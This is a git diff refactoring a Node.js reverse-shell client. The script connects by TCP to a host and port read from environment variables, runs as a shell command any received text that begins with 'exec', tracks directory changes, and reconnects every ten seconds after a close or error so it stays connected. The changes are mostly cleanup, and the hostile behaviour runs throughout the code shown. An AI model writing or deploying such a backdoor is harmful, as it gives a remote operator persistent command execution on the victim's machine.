@@ -13,20 +13,15 @@ let path = process.cwd();
 const PORT = process.env.PORT;
 const HOST = process.env.HOST;
 
-
 const client = new net.Socket();
+
 function connect() {
-  client.connect(PORT, HOST, () => {
-    // console.log(`Connected to ${host}:${port}`);
-  });
+  client.connect(PORT, HOST);
 }
 
 client.on("data", (data) => {
-	const dataStr = data.toString().toLowerCase();
-  if (
-    dataStr.startsWith("exec") &&
-    dataStr.split(" ")[1] === "cd"
-  ) {
+  const dataStr = data.toString().toLowerCase();
+  if (dataStr.startsWith("exec") && dataStr.split(" ")[1] === "cd") {
     path = shell.changeDir(data, path);
   }
 
@@ -39,21 +34,20 @@ client.on("data", (data) => {
       }
     );
   }
-  if (dataStr.toLowerCase().startsWith("exec"))
+  if (dataStr.startsWith("exec"))
     execute(dataStr.replace("exec", ""));
 });
 
-client.on("close", (e) => {
-  // console.log(`${HOST}:${PORT} not found. Attempting to reconnect.`);
-  client.setTimeout(5000, () => {
-    client.connect(PORT, HOST);
-  });
-});
-
-client.on("error", (err) => {
+client.on("close", () => {
   setTimeout(() => {
     connect();
   }, 10000);
 });
 
-client.connect(PORT, HOST);
+client.on("error", () => {
+  setTimeout(() => {
+    connect();
+  }, 10000);
+});
+
+connect();
